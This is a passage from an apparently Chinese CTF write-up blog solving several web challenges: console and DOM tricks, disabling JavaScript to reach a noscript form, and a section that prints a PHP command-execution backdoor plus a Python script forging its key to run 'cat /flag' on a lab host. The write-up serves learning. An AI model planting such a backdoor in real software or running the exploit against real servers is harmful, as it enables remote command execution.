+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">revealFlag</span>(<span class="params">className</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/flag/<span class="subst">$&#123;className&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`恭喜你！你获得了第二部分的 flag: <span class="subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="subst">$&#123;data.nextLevel&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;请求失败，请检查输入或服务器响应。&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;请求过程中出现错误:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 控制台提示</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以利用控制台(F12中), 控制台可以使用当前页面环境中的变量, 函数等, 并自动将返回值输出到控制台中, 语法就是js的语法, 这里我们只要执行revealFlag函数即可, 这里我们输出了revealFlag(“4cqu1siti0n”) 返回了对应的信息,</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025185824906.png" alt="image-20241025185824906"></p>
+<p>又跳转到&#x2F;s34l，出现如下界面，继续查看源码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025190353270.png" alt="image-20241025190353270"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;seal_him&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> stateElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;state&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> messageElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;message&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&#x27;解封&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    messageElement.<span class="property">textContent</span> = <span class="string">&#x27;如何是好？&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/flag/s34l&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">csrf_token</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrf_token&#x27;</span>).<span class="property">value</span> &#125;)</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">                        messageElement.<span class="property">textContent</span> = <span class="string">`第三部分Flag: <span class="subst">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="subst">$&#123;data.nextLevel || <span class="string">&#x27;无&#x27;</span>&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        messageElement.<span class="property">textContent</span> = <span class="string">&#x27;请求失败，请重试。&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">                    messageElement.<span class="property">textContent</span> = <span class="string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看不太懂，让ai分析一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">这段代码是一个使用JavaScript编写的客户端脚本，主要功能是处理表单提交并与服务器进行交互。让我来解释一下它的主要部分：​</span><br><span class="line">事件监听器设置：</span><br><span class="line">document.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">这行代码确保在DOM完全加载后才执行脚本。</span><br><span class="line">获取页面元素：</span><br><span class="line">const form = document.getElementById(<span class="string">&#x27;seal_him&#x27;</span>);const stateElement = document.getElementById(<span class="string">&#x27;state&#x27;</span>);const messageElement = document.getElementById(<span class="string">&#x27;message&#x27;</span>);​</span><br><span class="line">这些行获取了页面上的特定元素，以便后续操作。</span><br><span class="line">表单提交事件监听：</span><br><span class="line">form.addEventListener(<span class="string">&#x27;submit&#x27;</span>, async <span class="keyword">function</span> (event) &#123;</span><br><span class="line">这设置了表单提交的事件监听器。</span><br><span class="line">状态检查：</span><br><span class="line"><span class="keyword">if</span> (stateElement.textContent.trim() !== <span class="string">&#x27;解封&#x27;</span>) &#123;</span><br><span class="line">    messageElement.textContent = <span class="string">&#x27;如何是好？&#x27;</span>;<span class="built_in">return</span>;&#125;</span><br><span class="line">这个检查确保只有在状态为<span class="string">&quot;解封&quot;</span>时才继续执行。</span><br><span class="line">发送POST请求：</span><br><span class="line">const response = await fetch(<span class="string">&#x27;/api/flag/s34l&#x27;</span>, &#123;method: <span class="string">&#x27;POST&#x27;</span>,headers: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,body: JSON.stringify(&#123; csrf_token: document.getElementById(<span class="string">&#x27;csrf_token&#x27;</span>).value &#125;)&#125;);</span><br><span class="line">这段代码向服务器发送POST请求，包含CSRF令牌。</span><br><span class="line">处理响应：</span><br><span class="line"><span class="keyword">if</span> (response.ok) &#123;const data = await response.json();</span><br><span class="line">    messageElement.textContent = `第三部分Flag: <span class="variable">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="variable">$&#123;data.nextLevel || &#x27;无&#x27;&#125;</span>`;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    messageElement.textContent = <span class="string">&#x27;请求失败，请重试。&#x27;</span>;&#125;</span><br><span class="line">这部分处理服务器的响应，如果成功则显示flag和下一关信息，否则显示错误消息。</span><br><span class="line">错误处理：</span><br><span class="line">catch (error) &#123;</span><br><span class="line">    messageElement.textContent = <span class="string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;&#125;</span><br><span class="line">这捕获并处理可能发生的任何错误。</span><br><span class="line">总的来说，这段代码是一个交互式网页的一部分，可能是某种CTF（Capture The Flag）挑战或游戏的一个环节，用户需要满足特定条件（状态为<span class="string">&quot;解封&quot;</span>）才能获取flag并进入下一关。</span><br><span class="line">这个页面似乎是一个CTF（Capture The Flag）挑战的一部分，主题围绕着咒术回战中的五条悟被封印的情节。用户需要找到将状态改为<span class="string">&quot;解封&quot;</span>的方法，然后才能成功提交表单并获取flag。</span><br><span class="line">要完成这个挑战，用户可能需要：</span><br><span class="line">找到改变页面状态的方法（可能涉及修改HTML或使用开发者工具）</span><br><span class="line">将状态改为<span class="string">&quot;解封&quot;</span></span><br><span class="line">点击<span class="string">&quot;解封!!!&quot;</span>按钮提交表单</span><br><span class="line">获取第三部分的flag和下一关信息</span><br><span class="line">这种设计鼓励参与者探索网页结构和JavaScript交互，是一种常见的网络安全学习和CTF挑战形式。</span><br></pre></td></tr></table></figure>
+
+<p>其实这道题我们可以大概从函数名字猜测一下其功能，比如<strong>document.getElementById</strong>，直译就是通过id来获取元素，<strong>seal_him</strong>就是需要检索的元素，于是我们可以直接选中seal_him（什么是选中，大概就是你复制粘贴时采取的操作）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025195442259.png" alt="image-20241025195442259"></p>
+<p>选中时我们需要查看的元素就被标黄了，然后就能找到我们需要修改的地方，这道题的关键函数是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&#x27;解封&#x27;</span></span><br><span class="line"><span class="comment">// stateElement.textContent.trim()该函数作用是获取stateElement的内容</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025195935081.png" alt="image-20241025195935081"></p>
+<p>大概就是从stateElement找到state，就知道了我们是需要将已封印改成解封，最后再按下按钮</p>
+<p>这里我们右键”已封印”的字样, 点击”检查”, 就可以看到这个 字样在html源码中的位置</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025200648825.png" alt="image-20241025200648825"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025200746060.png" alt="image-20241025200746060"></p>
+<p>最后再跳转到&#x2F;Ap3x</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025200956950.png" alt="image-20241025200956950"></p>
+<p>继续查看js代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;noscript&gt;</span><br><span class="line">           <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;s&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/api/flag/Ap3x&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>无量空处！！<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">           <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span></span><br><span class="line">       </span><br><span class="line">       <span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">       <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                   event.<span class="title function_">preventDefault</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                   <span class="title function_">alert</span>(<span class="string">&quot;宿傩的领域太强了，有什么办法让他的领域失效呢？&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">               &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">               (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                   <span class="keyword">const</span> originalConsoleLog = <span class="variable language_">console</span>.<span class="property">log</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                   <span class="variable language_">console</span>.<span class="property">log</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                       originalConsoleLog.<span class="title function_">apply</span>(<span class="variable language_">console</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                       <span class="title function_">alert</span>(<span class="string">&quot;你觉得你能这么简单地获取到线索？&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                   &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">               &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里大概就是当我们点击按钮时，阻止默认行为（即阻止按钮真正的作用）, 并显示一个警告框, 以及执行一个函数, 重写 console.log 函数<br>所以我们的按钮没用了<br>但仔细在页面源码中找能发现一个<noscript>标签所包含的内容, 这个标签大概就是, 当用户的js由于某种原因被禁止无法执行时, 该标签内的源码就会发挥作用, 在此之前这部分的源码都相当于被注释掉一样<br>那我们关闭js就行,直接到搜索引擎上直接搜索 xxx浏览器怎么关闭js</p>
+<p>禁用了之后</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025201504797.png" alt="image-20241025201504797"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025201535934.png" alt="image-20241025201535934"></p>
+<p>最后将四段flag拼起来再base64解码就行（byd题目流程还挺长，不过也是助力五条老师打赢复活赛了！）</p>
+<h4 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h4><p>连接靶机，发现题目提示robots协议</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025224202549.png" alt="image-20241025224202549"></p>
+<p>robots协议具体可以去百度一下，我也不太清楚其实，反正在网址后面加上**&#x2F;robots.txt<strong>就对了，如下，又提示后门在</strong>&#x2F;backd0or.php**,再跳转查看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025224430046.png" alt="image-20241025224430046"></p>
+<p>发现了源码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025224552257.png" alt="image-20241025224552257"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//该代码主要实现的功能首先是检查是否用post传入了两个参数，一个是cmd，一个是key，然后进入decrypt_request()函数，首先将key进行base64解码得到decoded_key，然后将cmd逆序，再进行md5加密得到hashed_reversed_cmd，如果decoded_key与hashed_reversed_cmd相等的话，将cmd进行base64解码并赋值给$decrypted_cmd再传进execute_cmd()，用system执行$decrypted_cmd</span></span><br></pre></td></tr></table></figure>
+
+<p>最后通过脚本计算出key和cmd并完成传参</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for newstar_zhixieweiji&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze3vvqmif90w7echwea.cloudeci1.ichunqiu.com/backd0or.php&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">cmd_encoded = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"><span class="comment">#先将cmd进行base64编码</span></span><br><span class="line"></span><br><span class="line">cmd_reversed = cmd_encoded[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#将base64编码后的cmd逆序</span></span><br><span class="line"></span><br><span class="line">hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()</span><br><span class="line"><span class="comment">#再将其进行md5编码</span></span><br><span class="line">encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line"><span class="comment">#再进行base64加密</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: cmd_encoded,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: encoded_key</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="comment">#使用requests的request.post函数连接目标url，data是指要传的参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#response.text是指回响文本</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;cmd&#x27;:&quot;</span>,cmd_encoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key&#x27;</span>,encoded_key)</span><br></pre></td></tr></table></figure>
+
+<p>直接运行这个脚本就能拿到flag了</p>
+<h4 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a>PangBai 过家家（1）</h4><p>这道题难崩，跳转出问题了，一直都没看出来哪有提示，后来看了wp发现过完剧情会跳转，但是一直没有跳转，于是只有手动跳转到&#x2F;start</p>
+<p>这里提示我们查看标头，于是f12后点击网络并查看详细响应头</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026090535767.png" alt="image-20241026090535767"></p>
+<p>提示跳转到location那</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026090804803.png" alt="image-20241026090804803"></p>
